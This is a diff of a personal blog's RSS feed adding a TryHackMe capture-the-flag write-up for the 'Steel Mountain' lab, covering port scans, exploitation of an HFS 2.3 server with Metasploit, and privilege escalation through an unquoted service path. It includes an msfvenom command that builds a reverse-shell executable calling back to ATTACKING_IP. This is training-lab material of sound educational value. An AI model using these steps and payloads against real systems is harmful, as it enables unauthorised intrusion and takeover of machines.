@@ -6,7 +6,159 @@
     <description>Recent posts from on Mathew Alabi | •Kurrupt68</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 19 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://Kurrupt68.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 03 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://Kurrupt68.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>TryHackMe - Steel Mountain</title>
+      <link>https://Kurrupt68.github.io/post/thm-steel-mountain/</link>
+      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://Kurrupt68.github.io/post/thm-steel-mountain/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/steelmountain.jpeg&#34; alt=&#34;Header image&#34;&gt;
+Hack into a Mr.Robot themed Windows machine.&lt;/p&gt;
+&lt;p&gt;Another day to root a box let&amp;rsquo;s get to it.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Started with rustscan to get a list of open ports and then pass the ports to a nmap command, chose rustscan for it&amp;rsquo;s amazing speed.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt; ⚡ root@kali ❯ rustscan 10.10.63.218
+
+     _____           _    _____                 
+    |  __ \         | |  / ____|                
+    | |__) |   _ ___| |_| (___   ___ __ _ _ __  
+    |  _  / | | / __| __|\___ \ / __/ _` | &#39;_ \ 
+    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
+    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
+    Faster nmap scanning with rust. 
+ Automated Decryption Tool - https://github.com/ciphey/ciphey 
+ Creator https://github.com/brandonskerritt
+49152 open
+49153 open
+49154 open
+3389 open
+80 open
+445 open
+53730 open
+5723 open
+5985 open
+6100 open
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once completed a nmap scan starts and scans the open ports to discover the servicees running on them.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;Starting nmap -A -p [&amp;quot;445&amp;quot;, &amp;quot;3389&amp;quot;, &amp;quot;5985&amp;quot;, &amp;quot;8080&amp;quot;, &amp;quot;27976&amp;quot;, &amp;quot;47001&amp;quot;, &amp;quot;49152&amp;quot;, &amp;quot;49153&amp;quot;, &amp;quot;49154&amp;quot;, &amp;quot;49170&amp;quot;] -vvv 10.10.63.218 
+PORT      STATE SERVICE            REASON          VERSION
+80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn&#39;t have a title (text/html).
+139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
+| ssl-cert: Subject: commonName=steelmountain
+| Issuer: commonName=steelmountain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2022-05-01T11:43:39
+| Not valid after:  2022-10-31T11:43:39
+| MD5:   6533 0f18 5282 3036 fa38 ad7a d2b2 cad3
+| SHA-1: a95e cc83 6d92 5b8a 9c23 0ce9 078e 8a1b 8780 3e4b
+|_ssl-date: 2022-05-02T11:46:52+00:00; +58s from scanner time.
+5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+49170/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
+Uptime guess: 0.003 days (since Mon May  2 05:41:53 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 57s, deviation: 0s, median: 57s
+| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:77:d7:db:b4:9d (unknown)
+| Names:
+|   STEELMOUNTAIN&amp;lt;00&amp;gt;    Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|   STEELMOUNTAIN&amp;lt;20&amp;gt;    Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+| Statistics:
+|   02 77 d7 db b4 9d 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 35662/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 2 (port 34211/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 3 (port 42866/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 58184/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-05-02T11:46:45
+|_  start_date: 2022-05-02T11:43:28
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From the results above we see that there is a web server on port 80, browsing to http://IP-address:80/ there&amp;rsquo;s an image of the employee of the month, whose name can be seen by viewing the page source the name is the filename of the image.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/empl.png&#34;
+width=&#34;350&#34;
+height=&#34;300&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;From the scan above there&amp;rsquo;s a web service running on port 8080 browsing to http://IP-ADRESS:8080/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/hfs.png&#34;
+width=&#34;462&#34;
+height=&#34;307&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;HttpFile Server 2.3 server running, a quick google-fu shows that this server is vulnearable to CVE-2014-6287 and there are multiple exploits publicly available,running searchsploit shows there&amp;rsquo;s a metasploit module for this exploit.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/searchsploit.png&#34;
+width=&#34;600&#34;
+height=&#34;365&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Starting up msfconsole and loading the exploit &lt;strong&gt;windows/http/rejetto_hfs_exec&lt;/strong&gt;
+and then properly setting the options needed for the exploit to run.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/sm7.png&#34;
+width=&#34;800&#34;
+height=&#34;565&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;After running the exploit, got dropped into a meterpreter shell and navigating to the user directory to get the user flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/user-flag.png&#34;
+width=&#34;400&#34;
+height=&#34;218&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;priviledge-escalation&#34;&gt;Priviledge Escalation&lt;/h2&gt;
+&lt;p&gt;For priviledge escalation, I uploaded a copy of winpeas.exe to the box using meterpreter.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;meterpreter &amp;gt; upload ~/Tools/winPEAS.exe 
+[*] uploading  : /root/Tools/winPEAS.exe -&amp;gt; winPEAS.exe
+[*] Uploaded 1.85 MiB of 1.85 MiB (100.0%): /root/Tools/winPEAS.exe -&amp;gt; winPEAS.exe
+[*] uploaded   : /root/Tools/winPEAS.exe -&amp;gt; winPEAS.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;img src=&#34;https://Kurrupt68.github.io/win.png&#34;/&gt; 
+&lt;p&gt;Running winPEAS from the command line with the log option to save the output to out.txt and then downloading the file makes it easier to analyse results on my attacking machine.Of the numerous results from winpeas one that sticks out is a  unquoted service path vulnerability in one of the installed applications.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/adsc9.png&#34;
+width=&#34;800&#34;
+height=&#34;194&#34;
+/&gt;&lt;/p&gt;
+&lt;h4 id=&#34;what-is-an-unquoted-service-path-vulnerability&#34;&gt;What is an unquoted service path vulnerability?&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).&lt;br&gt;
+— &lt;cite&gt; Sumit Verma&lt;/cite&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The directory to the applictation is writeable so we can overwrite the application with a malicious one and restart the service which should run our program and give us SYSTEM priviledges.Using msfvenom we generate a executable that&amp;rsquo;s a reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Uploading the malicious executable to the box using meterpreter.&lt;/p&gt;
+&lt;img src=&#34;https://Kurrupt68.github.io/adsc2.png&#34;/&gt;
+&lt;p&gt;And then setting up our netcat listener before restarting the services to catch our shell, restarting the service using the sc command in the system shell does the trick and ez we now have SYSTEM privileges!.&lt;/p&gt;
+&lt;img src=&#34;https://Kurrupt68.github.io/whoami.png&#34;/&gt; 
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Steel Mountain is another easy decent box that resembles a real life scenario which is great because it helps you prepare for vulnerablities you might come across on an engagement bonus points for the Mr.Robot Theme.&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>TryHackMe - Gallery</title>
       <link>https://Kurrupt68.github.io/post/thm-gallery-writeup/</link>
@@ -206,7 +358,10 @@ reset; sh 1&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span
 uid=0(root) gid=0(root) groups=0(root)
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;Gallery is a decent easy box that helps get the basics in, I tried a ton of things trying to solve this box , a RCE script,the numerous sudo exploits.
-Note to self: Remember to check for backup files and exploiting capabilities.&lt;/p&gt;</description>
+Note to self: Remember to check for backup files and exploiting capabilities.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Kurrupt68.github.io/sqli-edb.png&#34; 
+width=&#34;683&#34; 
+height=&#34;354&#34; /&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
